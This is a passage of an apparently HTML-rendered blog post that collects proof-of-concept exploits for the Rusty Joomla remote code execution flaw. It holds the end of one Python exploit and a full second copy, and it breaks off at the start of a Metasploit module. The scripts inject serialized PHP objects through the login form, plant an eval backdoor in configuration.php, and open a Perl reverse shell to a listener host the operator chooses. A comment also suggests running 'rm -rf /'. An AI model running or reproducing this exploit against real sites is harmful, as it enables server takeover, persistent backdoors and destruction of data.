class="keyword">if</span> check_string <span class="keyword">in</span> html:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_backdoor</span><span class="params">(url,param_name)</span>:</span></span><br><span class="line">        res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;param_name:<span class="string">'echo \'PWNED\';'</span>&#125;, proxies = PROXS)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'PWNED'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_backdoor</span><span class="params">(url, payload_code)</span>:</span></span><br><span class="line">        <span class="comment"># Execute PHP code from the backdoor</span></span><br><span class="line">        res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;backdoor_param:payload_code&#125;, proxies = PROXS)</span><br><span class="line">        print(res.text)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url, lhost, lport)</span>:</span></span><br><span class="line">        <span class="comment"># Exploit the target</span></span><br><span class="line">        <span class="comment"># Default exploitation will append en eval function at the end of the configuration.pphp</span></span><br><span class="line">        <span class="comment"># as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters')</span></span><br><span class="line">        <span class="comment"># e.g. get_payload('system','rm -rf /')</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># First check that the backdoor has not been already implanted</span></span><br><span class="line">        target_url = url + <span class="string">'index.php/component/users'</span></span><br><span class="line"> </span><br><span class="line">        make_req(target_url, get_backdoor_pay())</span><br><span class="line">        <span class="keyword">if</span> ping_backdoor(url, backdoor_param):</span><br><span class="line">                print_ok(<span class="string">'Backdoor implanted, eval your code at '</span> + url + <span class="string">'/configuration.php in a POST with '</span> + backdoor_param)</span><br><span class="line">                print_info(<span class="string">'Now it\'s time to reverse, trying with a system + perl'</span>)</span><br><span class="line">                execute_backdoor(url, <span class="string">'system(\'perl -e \\\'use Socket;$i="'</span>+ lhost +<span class="string">'";$p='</span>+ str(lport) +<span class="string">';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;\\\'\');'</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        parser = argparse.ArgumentParser()</span><br><span class="line">        parser.add_argument(<span class="string">'-t'</span>,<span class="string">'--target'</span>,required=<span class="literal">True</span>,help=<span class="string">'Joomla Target'</span>)</span><br><span class="line">        parser.add_argument(<span class="string">'-c'</span>,<span class="string">'--check'</span>, default=<span class="literal">False</span>, action=<span class="string">'store_true'</span>, required=<span class="literal">False</span>,help=<span class="string">'Check only'</span>)</span><br><span class="line">        parser.add_argument(<span class="string">'-e'</span>,<span class="string">'--exploit'</span>,default=<span class="literal">False</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'Check and exploit'</span>)</span><br><span class="line">        parser.add_argument(<span class="string">'-l'</span>,<span class="string">'--lhost'</span>, required=<span class="string">'--exploit'</span> <span class="keyword">in</span> sys.argv, help=<span class="string">'Listener IP'</span>)</span><br><span class="line">        parser.add_argument(<span class="string">'-p'</span>,<span class="string">'--lport'</span>, required=<span class="string">'--exploit'</span> <span class="keyword">in</span> sys.argv, help=<span class="string">'Listener port'</span>)</span><br><span class="line">        args = vars(parser.parse_args())</span><br><span class="line"> </span><br><span class="line">        url = args[<span class="string">'target'</span>]</span><br><span class="line">        <span class="keyword">if</span>(check(url)):</span><br><span class="line">                print_ok(<span class="string">'Vulnerable'</span>)</span><br><span class="line">                <span class="keyword">if</span> args[<span class="string">'exploit'</span>]:</span><br><span class="line">                        exploit(url, args[<span class="string">'lhost'</span>], args[<span class="string">'lport'</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        print_info(<span class="string">'Use --exploit to exploit it'</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                print_error(<span class="string">'Seems NOT Vulnerable ;/'</span>)</span><br></pre></td></tr></table></figure><h3 id="POC-2-of-rusty-joomla-exploit-py"><a href="#POC-2-of-rusty-joomla-exploit-py" class="headerlink" title="POC 2 of rusty_joomla_exploit.py"></a>POC 2 of rusty_joomla_exploit.py</h3><blockquote><p>POC 2 and POC 3 from here:<a href="https://github.com/kiks7/rusty_joomla_rce" target="_blank" rel="noopener">https://github.com/kiks7/rusty_joomla_rce</a><br>thannk yours</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># Exploit Title: Rusty Joomla RCE</span></span><br><span class="line"><span class="comment"># Google Dork: N/A</span></span><br><span class="line"><span class="comment"># Date: 02/10/2019</span></span><br><span class="line"><span class="comment"># Exploit Author: Alessandro Groppo @Hacktive Security</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https//www.joomla.it/</span></span><br><span class="line"><span class="comment"># Software Link: https://downloads.joomla.org/it/cms/joomla3/3-4-6</span></span><br><span class="line"><span class="comment"># Version: 3.0.0 --&gt; 3.4.6</span></span><br><span class="line"><span class="comment"># Tested on: Linux 4.9.184</span></span><br><span class="line"><span class="comment"># CVE : [if applicable]</span></span><br><span class="line"><span class="comment"># Technical details: https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41</span></span><br><span class="line"><span class="comment"># Github: https://github.com/kiks7/rusty_joomla_rce</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The exploitation is implanting a backdoor in /configuration.php file in the root directory with an eval in order to be more suitable for all environments.</span></span><br><span class="line"><span class="comment"># If you don't like this way, you can replace the get_backdoor_pay() with get_pay('php_function', 'parameter') like get_pay('system','rm -rf /')</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"></span><br><span class="line">PROXS = &#123;<span class="string">'http'</span>:<span class="string">'127.0.0.1:8080'</span>&#125;</span><br><span class="line">PROXS = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_string</span><span class="params">(stringLength)</span>:</span></span><br><span class="line">letters = string.ascii_lowercase</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(stringLength))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor_param = random_string(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_info</span><span class="params">(str)</span>:</span></span><br><span class="line">print(colored(<span class="string">"[*] "</span> + str,<span class="string">"cyan"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_ok</span><span class="params">(str)</span>:</span></span><br><span class="line">print(colored(<span class="string">"[+] "</span>+ str,<span class="string">"green"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_error</span><span class="params">(str)</span>:</span></span><br><span class="line">print(colored(<span class="string">"[-] "</span>+ str,<span class="string">"red"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_warning</span><span class="params">(str)</span>:</span></span><br><span class="line">print(colored(<span class="string">"[!!] "</span> + str,<span class="string">"yellow"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">token = <span class="string">''</span></span><br><span class="line">resp = requests.get(url, cookies=cook, proxies = PROXS)</span><br><span class="line">html = BeautifulSoup(resp.text,<span class="string">'html.parser'</span>)</span><br><span class="line"><span class="comment"># csrf token is the last input</span></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> html.find_all(<span class="string">'input'</span>):</span><br><span class="line">csrf = v</span><br><span class="line">csrf = csrf.get(<span class="string">'name'</span>)</span><br><span class="line"><span class="keyword">return</span> csrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_error</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">resp = requests.get(url, cookies = cook, proxies = PROXS)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Failed to decode session object'</span> <span class="keyword">in</span> resp.text:</span><br><span class="line"><span class="comment">#print(resp.text)</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#print(resp.text)</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cook</span><span class="params">(url)</span>:</span></span><br><span class="line">resp = requests.get(url, proxies=PROXS)</span><br><span class="line"><span class="comment">#print(resp.cookies)</span></span><br><span class="line"><span class="keyword">return</span> resp.cookies</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_pay</span><span class="params">(function, command)</span>:</span></span><br><span class="line"><span class="comment"># Generate the payload for call_user_func('FUNCTION','COMMAND')</span></span><br><span class="line">template = <span class="string">'s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:&#123;s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:&#123;&#125;s:21:"\\0\\0\\0disconnectHandlers";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"SimplePie":5:&#123;s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:&#123;&#125;s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span></span><br><span class="line"><span class="comment">#payload =  command + ' || $a=\'http://wtf\';'</span></span><br><span class="line">payload =  <span class="string">'http://l4m3rz.l337/;'</span> + command</span><br><span class="line"><span class="comment"># Following payload will append an eval() at the enabled of the configuration file</span></span><br><span class="line"><span class="comment">#payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'test\\\'])) eval($_POST[\\\'test\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'</span></span><br><span class="line">function_len = len(function)</span><br><span class="line">final = template.replace(<span class="string">'PAYLOAD'</span>,payload).replace(<span class="string">'LENGTH'</span>, str(len(payload))).replace(<span class="string">'FUNC_NAME'</span>, function).replace(<span class="string">'FUNC_LEN'</span>, str(len(function)))</span><br><span class="line"><span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_req</span><span class="params">(url , object_payload)</span>:</span></span><br><span class="line"><span class="comment"># just make a req with object</span></span><br><span class="line">print_info(<span class="string">'Getting Session Cookie ..'</span>)</span><br><span class="line">cook = get_cook(url)</span><br><span class="line">print_info(<span class="string">'Getting CSRF Token ..'</span>)</span><br><span class="line">csrf = get_token( url, cook)</span><br><span class="line"></span><br><span class="line">user_payload = <span class="string">'\\0\\0\\0'</span> * <span class="number">9</span></span><br><span class="line">padding = <span class="string">'AAA'</span> <span class="comment"># It will land at this padding</span></span><br><span class="line">working_test_obj = <span class="string">'s:1:"A":O:18:"PHPObjectInjection":1:&#123;s:6:"inject";s:10:"phpinfo();";&#125;'</span></span><br><span class="line">clean_object = <span class="string">'A";s:5:"field";s:10:"AAAAABBBBB'</span> <span class="comment"># working good without bad effects</span></span><br><span class="line"></span><br><span class="line">inj_object = <span class="string">'";'</span></span><br><span class="line">inj_object += object_payload</span><br><span class="line">inj_object += <span class="string">'s:6:"return";s:102:'</span> <span class="comment"># end the object with the 'return' part</span></span><br><span class="line">password_payload = padding + inj_object</span><br><span class="line">params = &#123;</span><br><span class="line">            <span class="string">'username'</span>: user_payload,</span><br><span class="line">            <span class="string">'password'</span>: password_payload,</span><br><span class="line">            <span class="string">'option'</span>:<span class="string">'com_users'</span>,</span><br><span class="line">            <span class="string">'task'</span>:<span class="string">'user.login'</span>,</span><br><span class="line">            csrf :<span class="string">'1'</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">print_info(<span class="string">'Sending request ..'</span>)</span><br><span class="line">resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)</span><br><span class="line"><span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_backdoor_pay</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment"># This payload will backdoor the the configuration .PHP with an eval on POST request</span></span><br><span class="line"></span><br><span class="line">function = <span class="string">'assert'</span></span><br><span class="line">template = <span class="string">'s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:&#123;s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:&#123;&#125;s:21:"\\0\\0\\0disconnectHandlers";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"SimplePie":5:&#123;s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:&#123;&#125;s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span></span><br><span class="line"><span class="comment"># payload =  command + ' || $a=\'http://wtf\';'</span></span><br><span class="line"><span class="comment"># Following payload will append an eval() at the enabled of the configuration file</span></span><br><span class="line">payload =  <span class="string">'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\''</span> + backdoor_param +<span class="string">'\\\'])) eval($_POST[\\\''</span>+backdoor_param+<span class="string">'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'</span></span><br><span class="line">function_len = len(function)</span><br><span class="line">final = template.replace(<span class="string">'PAYLOAD'</span>,payload).replace(<span class="string">'LENGTH'</span>, str(len(payload))).replace(<span class="string">'FUNC_NAME'</span>, function).replace(<span class="string">'FUNC_LEN'</span>, str(len(function)))</span><br><span class="line"><span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">check_string = random_string(<span class="number">20</span>)</span><br><span class="line">target_url = url + <span class="string">'index.php/component/users'</span></span><br><span class="line">html = make_req(url, gen_pay(<span class="string">'print_r'</span>,check_string))</span><br><span class="line"><span class="keyword">if</span> check_string <span class="keyword">in</span> html:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_backdoor</span><span class="params">(url,param_name)</span>:</span></span><br><span class="line">res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;param_name:<span class="string">'echo \'PWNED\';'</span>&#125;, proxies = PROXS)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'PWNED'</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_backdoor</span><span class="params">(url, payload_code)</span>:</span></span><br><span class="line"><span class="comment"># Execute PHP code from the backdoor</span></span><br><span class="line">res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;backdoor_param:payload_code&#125;, proxies = PROXS)</span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url, lhost, lport)</span>:</span></span><br><span class="line"><span class="comment"># Exploit the target</span></span><br><span class="line"><span class="comment"># Default exploitation will append en eval function at the end of the configuration.pphp</span></span><br><span class="line"><span class="comment"># as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters')</span></span><br><span class="line"><span class="comment"># e.g. get_payload('system','rm -rf /')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First check that the backdoor has not been already implanted</span></span><br><span class="line">target_url = url + <span class="string">'index.php/component/users'</span></span><br><span class="line"></span><br><span class="line">make_req(target_url, get_backdoor_pay())</span><br><span class="line"><span class="keyword">if</span> ping_backdoor(url, backdoor_param):</span><br><span class="line">print_ok(<span class="string">'Backdoor implanted, eval your code at '</span> + url + <span class="string">'/configuration.php in a POST with '</span> + backdoor_param)</span><br><span class="line">print_info(<span class="string">'Now it\'s time to reverse, trying with a system + perl'</span>)</span><br><span class="line">execute_backdoor(url, <span class="string">'system(\'perl -e \\\'use Socket;$i="'</span>+ lhost +<span class="string">'";$p='</span>+ str(lport) +<span class="string">';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;\\\'\');'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">'-t'</span>,<span class="string">'--target'</span>,required=<span class="literal">True</span>,help=<span class="string">'Joomla Target'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-c'</span>,<span class="string">'--check'</span>, default=<span class="literal">False</span>, action=<span class="string">'store_true'</span>, required=<span class="literal">False</span>,help=<span class="string">'Check only'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-e'</span>,<span class="string">'--exploit'</span>,default=<span class="literal">False</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'Check and exploit'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-l'</span>,<span class="string">'--lhost'</span>, required=<span class="string">'--exploit'</span> <span class="keyword">in</span> sys.argv, help=<span class="string">'Listener IP'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-p'</span>,<span class="string">'--lport'</span>, required=<span class="string">'--exploit'</span> <span class="keyword">in</span> sys.argv, help=<span class="string">'Listener port'</span>)</span><br><span class="line">args = vars(parser.parse_args())</span><br><span class="line"></span><br><span class="line">url = args[<span class="string">'target'</span>]</span><br><span class="line"><span class="keyword">if</span>(check(url)):</span><br><span class="line">print_ok(<span class="string">'Vulnerable'</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'exploit'</span>]:</span><br><span class="line">exploit(url, args[<span class="string">'lhost'</span>], args[<span class="string">'lport'</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print_info(<span class="string">'Use --exploit to exploit it'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print_error(<span class="string">'Seems NOT Vulnerable ;/'</span>)</span><br></pre></td></tr></table></figure><h3 id="POC-3-of-MSF"><a href="#POC-3-of-MSF" class="headerlink" title="POC 3 of MSF"></a>POC 3 of MSF</h3><blockquote><p>file name:metasploit_rusty_joomla_rce.rb</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span 